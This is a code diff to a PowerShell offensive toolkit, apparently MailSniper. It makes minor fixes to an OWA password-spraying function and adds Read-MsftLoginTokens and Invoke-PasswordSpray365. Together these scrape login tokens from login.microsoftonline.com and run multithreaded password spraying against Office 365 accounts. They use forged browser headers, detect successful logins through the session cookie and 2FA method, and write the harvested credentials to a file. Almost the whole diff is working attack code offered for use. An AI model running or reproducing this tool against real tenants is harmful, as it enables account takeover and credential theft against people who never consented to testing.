@@ -1604,7 +1604,7 @@ function Invoke-PasswordSprayOWA{
     
     .PARAMETER Status
 
-        Display the current user is attempting to password spray.
+        Display the current user that the password spray is attempting.
 
   
   .EXAMPLE
@@ -1635,9 +1635,9 @@ Param(
     $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
     $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
   
-    if ($UsernamesList -eq "")
+    if ($UserList -eq "")
         {
-            Write-Error "Invalid number of arguments given. Require -UsernamesList"
+            Write-Error "Invalid number of arguments given. Require -UserList"
         }
     elseif ($Password -eq "")
         {
@@ -1664,7 +1664,7 @@ Param(
     # Populate the Email/Password Lists
     $Usernames | ForEach-Object {$userlists[$count % $Threads] += @($_);$count++}
   
-  # Does a depth first loop over usernames first, trying every password for each username sequentially in the list
+    # Does a depth first loop over usernames first, trying every password for each username sequentially in the list
 
     foreach ($Password in $PwdList) 
     {
@@ -1679,7 +1679,7 @@ Param(
             }  
         }
 
-    write-Host -ForegroundColor Red "[*]Spraying password $Password"
+    write-Host -ForegroundColor Red "[*] Spraying password $Password"
 
     0..($Threads - 1) | % {  
         
@@ -1815,6 +1815,314 @@ Param(
 }
 
 if ($OutFile -ne "")
+  {
+      $FoundedCreds = Get-Content $OutFile | Measure-Object
+      Write-Host ("[*] A total of " + $FoundedCreds.Count + " credentials were obtained.")
+      Write-Output "Results have been written to $OutFile."
+  }
+}
+
+function Read-MsftLoginTokens {
+  <#
+  .SYNOPSIS
+  Retrieve the necessary tokens to prime username enumeration
+  and password spraying.
+
+  .DESCRIPTION
+  This module retrieves the nonce, flowToken and ctx tokens from
+  the login.microsoftonline.com page. These items are necessary
+  for login attempts. A PSObject is returned of the form:
+  {
+      Referer: "$Uri";
+      Ctx: "$Ctx";
+      FlowToken: "$FlowToken";
+      originalToken: "$originalToken";
+      sessionId "$sessionId";
+  }
+
+  Function: Read-MsftLoginTokens
+  Author: Dwight Hohnstein (@djhohnstein)
+  Modify by: Michael
+  License: MIT
+  Required Dependencies: PowerShell 3.0 or above.
+  Optional Dependencies: None
+
+  .EXAMPLE
+  $tokens = Read-MsftLoginTokens
+
+  #>
+
+  $results = @{}
+  $request = [System.Net.WebRequest]::Create("https://login.microsoftonline.com/")
+  $response = $request.GetResponse()
+  $stream = $response.GetResponseStream()
+  $streamReader = New-Object System.IO.StreamReader $stream
+  $htmlResp = $streamReader.ReadToEnd()
+
+
+  if ($stream -eq $null)
+  {
+      Write-Error "Could not retrieve value of tokens. This indicates that the HTML structure of the document has changed. Open an issue report on Github!"
+      return $results
+  }
+  else
+  {
+      $Referer = $response.ResponseUri.AbsoluteUri
+      $results.Referer = $Referer
+      
+      $flowRequestToken = [regex]::Match($htmlResp,'.*(\"sFT.*),\"sFTName.*').captures.groups[1].value
+      $flowToken = $flowRequestToken | %{$_.split('"')[3]}
+      $results.FlowToken = $FlowToken
+
+      $CanaryRequest = [regex]::Match($htmlResp,'.*(\"canary.*),\"correlationId.*').captures.groups[1].value
+      $Canary = $CanaryRequest | %{$_.split('"')[3]}
+      $results.Canary = $Canary
+
+      $sessionIdRequest = [regex]::Match($htmlResp,'.*(\"sessionId.*),\"locale.*').captures.groups[1].value
+      $sessionId = $sessionIdRequest | %{$_.split('"')[3]}
+      $results.sessionId = $sessionId
+      
+      $ctxRequestToken = [regex]::Match($htmlResp,'.*(\"sCtx.*),\"iProductIcon.*').captures.groups[1].value
+      $ctxToken = $ctxRequestToken | %{$_.split('"')[3]}
+      $results.ctx = $ctxToken
+
+      return $results
+  }
+}
+
+function Invoke-PasswordSpray365{
+
+<#
+.SYNOPSIS
+
+  This module will first attempt to connect to an Outlook Web Access portal and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
+
+  MailSniper Function: Invoke-PasswordSpray365
+  Author: Michael 
+  License: BSD 3-Clause
+  Required Dependencies: None
+  Optional Dependencies: None
+
+  .DESCRIPTION
+
+      This module will first attempt to connect to an Outlook Web Access portal and perform a password spraying attack using a userlist and a single password. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
+
+  .PARAMETER OutFile
+
+      Outputs the results to a text file.
+
+  .PARAMETER UserList
+
+      List of usernames 1 per line to to attempt to password spray against.
+
+  .PARAMETER Password
+
+      A single password to attempt a password spray with or a list of paasword 1 per line to to attempt to password spray against..
+
+  .PARAMETER Threads
+     
+      Number of password spraying threads to run.
+  
+  .PARAMETER Waittime
+
+      Specify an amount of time to wait before starting the next password spray.
+  
+  .PARAMETER FailedAttempts
+
+      Specify an amount of Attempts to try before waiting. This must be used with waittime.
+  
+  .PARAMETER Status
+
+      Display the current user that the password spray is attempting.
+
+.EXAMPLE
+
+  C:\PS> Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt
+
+  Description
+  -----------
+  This command will connect to the Office 365 Outlook Web Access server and attempt to password spray a list of usernames with a single password over 15 threads and write to a file called owa-sprayed-creds.txt.
+
+#>
+Param(
+  [Parameter(Position = 0, Mandatory = $False)][string]$OutFile = "",
+  [Parameter(Position = 1, Mandatory = $False)][string]$UserList = "",
+  [Parameter(Position = 2, Mandatory = $False)][string]$Password = "",
+  [Parameter(Position = 3, Mandatory = $False)][string]$Threads = "5",
+  [Parameter(Position = 4, Mandatory = $False)][int]$Waittime = "",
+  [Parameter(Position = 5, Mandatory = $False)][int]$FailedAttempts = "",
+  [Parameter(Position = 6, Mandatory = $False)][ValidateSet("Y","N")][String]$Status = "Y"
+) 
+
+  Write-Host -ForegroundColor "yellow" "[*] Now spraying the Office 365 OWA portal"
+  $currenttime = Get-Date
+  Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
+
+  if ($UserList -eq "")
+      {
+          Write-Error "Invalid number of arguments given. Require -UserList"
+      }
+  elseif ($Password -eq "")
+      {
+          Write-Error "Invalid number of arguments given. Require -Password"
+      }
+
+  if(Test-Path $Password)
+      {
+          $PwdList = Get-Content $Password
+      }
+  else
+      {
+          $PwdList = $Password
+      }  
+
+  $Usernames = Get-Content $UserList
+  $count = $Usernames.count
+  $PasswordCount = $Passwords.Count
+  $sprayed = @()
+  $userlists = @{}
+  $count = 0 
+  $FailedCount = 0
+
+  # Populate the Email/Password Lists
+  $Usernames | ForEach-Object {$userlists[$count % $Threads] += @($_);$count++}
+
+  $uri = "https://login.microsoftonline.com"
+  $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+  $headers.Add("Host", "login.microsoftonline.com")
+  $headers.Add("Origin", "https://login.microsoftonline.com")
+  $headers.Add("Upgrade-Insecure-Requests", "1")
+  $headers.Add("Content-Type", "application/x-www-form-urlencoded")
+  $headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0")
+  $headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+  $headers.Add("Accept-Encoding", "gzip, deflate")
+  $headers.Add("Accept-Language", "en-US,en;q=0.5")
+  
+  # Does a depth first loop over usernames first, trying every password for each username sequentially in the list
+
+  foreach ($Password in $PwdList) 
+  {
+      if($FailedAttempts -le ($FailedCount/$Threads))
+      {
+          if($Waittime -ge 1)
+          {
+              $currenttime = Get-Date
+              write-Host "[*] Sleeping for $Waittime minutes - Current date and time: $currenttime"
+              Start-Sleep -Seconds ($Waittime*60)
+              $FailedCount = 0
+          }  
+      }
+
+  write-Host -ForegroundColor Red "[*] Spraying password $Password"
+
+  0..($Threads - 1) | % {
+      
+  $Tokens = Read-MsftLoginTokens
+ 
+      # Loops through passwords in the list sequentially
+          Start-Job -ScriptBlock {
+              
+              $Password = $args[1]
+              $uri = $args[2]
+              $headers = $args[3]
+              $Tokens = $args[4]
+              
+              $Flowtoken = $Tokens.flowtoken 
+              $Canary = $Tokens.Canary 
+              $sessionId = $Tokens.sessionId
+              $Referer = $Tokens.Referer
+              $ctx = $Tokens.ctx
+              $headers.Add("Referer", $Referer)  
+                                
+              foreach ($Username in $args[0]) 
+                  {
+                      #Logging into Office 365 portal
+                            
+                      $SessionData = Invoke-WebRequest -Uri $Tokens.Referer -SessionVariable session -Method Post 
+                      $PostDataStage = "i13=0&login=$Username&loginfmt=$Username&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=$Password&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=$Canary&ctx=$ctx&hpgrequestid=$sessionID&flowToken=$flowtoken&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=&i18=&i19=1153050"
+
+                      $O365Request = Invoke-WebRequest -Uri "$uri/common/login" -Headers $headers -Method POST -Body $PostDataStage -MaximumRedirection 0 -WebSession $session 
+
+                      #if ($Status -eq 'Y')
+                      #    {
+                              write-host "`t Current User:$Username Current Password:$password"
+                      #    }
+
+                        $SetCookieString = $O365Request.Headers["Set-Cookie"]
+                        $CookieArray = $SetCookieString.Split(";").Trim()
+                        
+                          ForEach ($Cookie in $CookieArray)
+                          {
+                              $KeyValue = $Cookie.Split("=", 2)
+
+                          if ($KeyValue -match "ESTSAUTH")
+                              {
+                                  $MfaIndex = $O365Request.Content.IndexOf("authMethodId`":`"")
+                                  if ($MfaIndex -gt -1)
+                                  {
+                                      $MfaIndex += 15
+                                      $EndMfaIndex = $O365Request.Content.IndexOf("`"", $MfaIndex)
+                                      $AuthMethod = $O365Request.Content.Substring($MfaIndex, $EndMfaIndex-$MfaIndex)
+                                      Write-Output "[*] SUCCESS! User: $Username Password: $Password (2FA: $AuthMethod)"
+                                      break
+                                  }
+                                  else
+                                  {
+                                      Write-Output "[*] SUCCESS! User: $Username Password: $Password"
+                                      break
+                                  }
+                              }
+                          }
+                    }
+  
+                  $curr_user+=1
+                  
+          } -ArgumentList $userlists[$_], $Password, $uri, $headers, $Tokens | Out-Null
+          
+          $FailedCount+=1
+    }
+  
+  $Complete = Get-Date
+  $MaxWaitAtEnd = 10000
+  $SleepTimer = 200
+  $FullResults = @()
+  While($(Get-Job -State Running).Count -gt 0)
+      {
+          $RunningJobs = ""
+          ForEach($Job in $(Get-Job -State Running))
+              {
+                  $RunningJobs += ", $($Job.name)"
+              }       
+
+          $RunningJobs = $RunningJobs.Substring(2)
+          Write-Progress -Activity "Spraying password $Password..." -Status "$($(Get-Job -State Running).Count) threads remaining" -PercentComplete ($(Get-Job -State Completed).Count / $(Get-Job).Count * 100)
+          if($(New-TimeSpan $Complete $(Get-Date)).TotalSeconds -ge $MaxWaitAtEnd)
+              {
+                  Write-Host -ForegroundColor "red" "Time expired. Killing remaining jobs..."
+                  Get-Job -State Running | Remove-Job -Force
+              }
+          else
+          {
+              Start-Sleep -Milliseconds $SleepTimer
+              ForEach($Job in Get-Job)
+              {
+                  $JobOutput = Receive-Job $Job
+                  if ($JobOutput)
+                  {
+                      Write-Host -ForegroundColor "green" $JobOutput
+                      $FullResults += $JobOutput                   
+                      if ($OutFile -ne "")
+                          {
+                              Write-Verbose "Writing results to $OutFile"
+                              $FullResults | Out-File -Encoding ascii -Append $OutFile
+                          } 
+                  }
+              }
+          }
+      }      
+  }
+
+  if ($OutFile -ne "")
   {
       $FoundedCreds = Get-Content $OutFile | Measure-Object
       Write-Host ("[*] A total of " + $FoundedCreds.Count + " credentials were obtained.")
